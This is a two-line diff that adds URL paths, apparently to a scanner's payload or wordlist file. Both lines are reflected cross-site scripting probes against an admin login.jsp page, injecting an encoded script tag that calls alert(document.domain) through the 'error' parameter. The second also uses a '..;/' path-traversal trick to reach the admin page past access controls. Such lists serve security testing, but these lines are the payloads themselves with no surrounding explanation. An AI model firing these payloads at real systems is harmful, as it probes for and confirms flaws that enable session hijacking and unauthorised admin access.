@@ -1,0 +1,2 @@
+/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
+/acs/..;/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
